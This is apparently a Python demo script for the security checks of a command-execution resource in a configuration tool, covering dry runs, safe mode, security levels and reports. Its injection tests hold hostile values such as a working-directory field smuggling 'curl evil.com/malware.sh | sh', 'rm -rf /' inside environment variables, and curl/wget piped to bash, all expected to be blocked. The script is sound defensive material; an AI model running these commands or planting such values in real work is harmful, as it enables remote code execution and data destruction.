#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Demonstration of Exec resource security features.

This example shows:
1. Dry-run mode (preview without execution)
2. Safe mode (strict security validation)
3. Security warnings and violations
4. Secure vs insecure patterns
"""

from cook import Exec

print("=" * 70)
print("EXEC RESOURCE SECURITY DEMONSTRATION")
print("=" * 70)

# ============================================================================
# SECTION 1: DRY RUN MODE (Non-destructive preview)
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 1: DRY RUN MODE - Preview without execution")
print("=" * 70)

# Safe to preview potentially dangerous commands
Exec("preview-backup",
     command="tar czf /backup/data.tar.gz /var/data",
     dry_run=True)

Exec("preview-deploy",
     command="./deploy.sh --production",
     dry_run=True)

# Preview with environment variables
Exec("preview-with-env",
     command="python migrate.py",
     environment={"DB_HOST": "localhost", "DB_NAME": "mydb"},
     cwd="/app",
     dry_run=True)

# ============================================================================
# SECTION 2: SECURITY WARNINGS (warn but allow)
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 2: SECURITY WARNINGS - Dangerous patterns detected")
print("=" * 70)

# This will show warnings but execute when safe_mode=False
Exec("warning-example",
     command="echo 'test' && ls -la",
     safe_mode=False,
     security_level="warn",
     dry_run=True)  # Using dry_run to not actually execute

# Dangerous command patterns
Exec("chmod-warning",
     command="chmod 777 /tmp/test.txt",
     safe_mode=False,
     security_level="warn",
     dry_run=True)

# ============================================================================
# SECTION 3: SAFE MODE (strict validation)
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 3: SAFE MODE - Strict security validation")
print("=" * 70)

# Safe command with safe mode (default behavior)
try:
    Exec("safe-backup",
         command="tar czf /backup/data.tar.gz /var/data",
         dry_run=True)
    print("[OK] Safe command passed validation (safe_mode=True by default)")
except Exception as e:
    print(f"[FAIL] Safe command failed: {e}")

# Pipes are allowed by default even in safe mode
try:
    Exec("safe-pipe",
         command="ps aux | grep python",
         allow_pipes=True,
         dry_run=True)
    print("[OK] Pipe allowed with allow_pipes=True (safe_mode=True by default)")
except Exception as e:
    print(f"[FAIL] Pipe failed: {e}")

# ============================================================================
# SECTION 4: SECURITY VIOLATIONS (blocked in strict mode)
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 4: SECURITY VIOLATIONS - Blocked in strict/safe mode")
print("=" * 70)

# Command chaining (blocked by default - safe_mode=True)
print("\n[TEST] Command chaining with ;")
try:
    Exec("injection-test-1",
         command="echo hello; rm -rf /tmp/test",
         dry_run=True)
    print("[FAIL] FAILED: Should have blocked command chaining")
except Exception as e:
    print(f"[OK] BLOCKED by default safe_mode: {type(e).__name__}")

# Command substitution (blocked by default)
print("\n[TEST] Command substitution with $()")
try:
    Exec("injection-test-2",
         command="echo $(whoami)",
         dry_run=True)
    print("[FAIL] FAILED: Should have blocked command substitution")
except Exception as e:
    print(f"[OK] BLOCKED by default safe_mode: {type(e).__name__}")

# Environment variable injection
print("\n[TEST] Environment variable injection")
try:
    Exec("injection-test-3",
         command="echo test",
         environment={"MALICIOUS": "value; rm -rf /"},
         dry_run=True)
    print("[FAIL] FAILED: Should have blocked env injection")
except Exception as e:
    print(f"[OK] BLOCKED by default safe_mode: {type(e).__name__}")

# Working directory injection
print("\n[TEST] Working directory injection")
try:
    Exec("injection-test-4",
         command="ls",
         cwd="/tmp; curl evil.com/malware.sh | sh",
         dry_run=True)
    print("[FAIL] FAILED: Should have blocked cwd injection")
except Exception as e:
    print(f"[OK] BLOCKED by default safe_mode: {type(e).__name__}")

# Backtick command substitution
print("\n[TEST] Backtick command substitution")
try:
    Exec("injection-test-5",
         command="echo `whoami`",
         dry_run=True)
    print("[FAIL] FAILED: Should have blocked backticks")
except Exception as e:
    print(f"[OK] BLOCKED by default safe_mode: {type(e).__name__}")

# Pipe to shell (dangerous pattern)
print("\n[TEST] Curl pipe to shell")
try:
    Exec("injection-test-6",
         command="curl https://example.com/script.sh | bash",
         allow_pipes=True,  # Even with pipes allowed
         dry_run=True)
    print("[FAIL] FAILED: Should have warned about curl|bash")
except Exception as e:
    print(f"[OK] BLOCKED by default safe_mode: {type(e).__name__}")

# ============================================================================
# SECTION 5: SECURITY LEVELS
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 5: SECURITY LEVELS - none, warn, strict")
print("=" * 70)

# Level: NONE - no validation (dangerous!)
print("\n[LEVEL: NONE] No security checks")
Exec("no-security",
     command="echo test && ls",
     safe_mode=False,
     security_level="none",
     dry_run=True)
print("[OK] Executed without checks (NOT RECOMMENDED)")

# Level: WARN - show warnings but allow
print("\n[LEVEL: WARN] Show warnings but allow")
Exec("warn-security",
     command="echo test && ls",
     safe_mode=False,  # Must disable safe_mode
     security_level="warn",
     dry_run=True)
print("[OK] Executed with warnings")

# Level: STRICT - block dangerous patterns (DEFAULT)
print("\n[LEVEL: STRICT] Block dangerous patterns (DEFAULT)")
try:
    Exec("strict-security",
         command="echo test && ls",
         dry_run=True)
    print("[FAIL] FAILED: Should have blocked")
except Exception as e:
    print(f"[OK] BLOCKED by default: {type(e).__name__}")

# ============================================================================
# SECTION 6: SECURITY REPORT
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 6: SECURITY REPORT - Analyze without blocking")
print("=" * 70)

# Create resource and get security report
dangerous_exec = Exec("analyze-me",
                      command="wget http://example.com/script.sh | bash",
                      environment={"PATH": "/usr/bin; rm -rf /"},
                      safe_mode=False,
                      security_level="none",  # Don't block, just analyze
                      dry_run=True)

report = dangerous_exec.get_security_report()
print(f"\nResource: {report['resource']}")
print(f"Security Level: {report['security_level']}")
print(f"Risk Level: {report['risk_level'].upper()}")
print(f"\nIssues found ({len(report['issues'])}):")
for issue in report['issues']:
    print(f"  - {issue}")

# ============================================================================
# SECTION 7: SAFE PATTERNS (recommended)
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 7: SAFE PATTERNS - Recommended secure usage")
print("=" * 70)

# Safe: Simple command with no shell features
Exec("safe-1",
     command="systemctl status nginx",
     dry_run=True)
print("[OK] Simple command - safe (protected by default safe_mode)")

# Safe: Command with allowed pipes
Exec("safe-2",
     command="ps aux | grep python | head -5",
     allow_pipes=True,
     dry_run=True)
print("[OK] Pipes explicitly allowed - acceptable")

# Safe: Command with allowed redirects
Exec("safe-3",
     command="echo 'test' > /tmp/output.txt",
     allow_redirects=True,
     dry_run=True)
print("[OK] Redirects explicitly allowed - acceptable")

# Safe: Creates guard (idempotent)
Exec("safe-4",
     command="wget https://example.com/file.tar.gz",
     creates="/tmp/file.tar.gz",
     dry_run=True)
print("[OK] Creates guard prevents re-execution - safe")

# Safe: Unless guard (conditional)
Exec("safe-5",
     command="apt-get update",
     unless="test -f /var/lib/apt/periodic/update-success-stamp",
     dry_run=True)
print("[OK] Unless guard for conditional execution - safe")

# ============================================================================
# SECTION 8: PREVIEW COMMAND
# ============================================================================

print("\n" + "=" * 70)
print("SECTION 8: PREVIEW - See final command before execution")
print("=" * 70)

preview_exec = Exec("preview-test",
                    command="python script.py",
                    environment={"API_KEY": "secret123", "DEBUG": "true"},
                    cwd="/app",
                    dry_run=True)

print(f"\nOriginal command: {preview_exec.command}")
print(f"Final command: {preview_exec.preview()}")
print("\nNote: Environment variables are properly quoted to prevent injection")

# ============================================================================
# SUMMARY
# ============================================================================

print("\n" + "=" * 70)
print("SECURITY BEST PRACTICES SUMMARY")
print("=" * 70)
print("""
1. ALWAYS use dry_run=True when testing new commands
2. safe_mode=True is DEFAULT - only disable with extreme caution
3. NEVER pass unsanitized user input to Exec
4. USE creates/unless/only_if guards for idempotency
5. security_level='strict' is DEFAULT - secure by default
6. REVIEW get_security_report() before deployment
7. USE preview() to inspect final command
8. AVOID command chaining (;, &&, ||) when possible
9. AVOID command substitution ($(), ``) when possible
10. USE dedicated resources (File, Package, Service) instead of Exec when possible
11. If you must use safe_mode=False, expect RED warnings on every execution

SAFE ALTERNATIVES TO EXEC:
- Package("nginx")           instead of  Exec("install", "apt-get install nginx")
- File("/etc/config")        instead of  Exec("config", "echo ... > /etc/config")
- Service("nginx", ...)      instead of  Exec("restart", "systemctl restart nginx")
""")

print("\n" + "=" * 70)
print("Demo complete! All tests used dry_run=True (no actual execution)")
print("=" * 70)
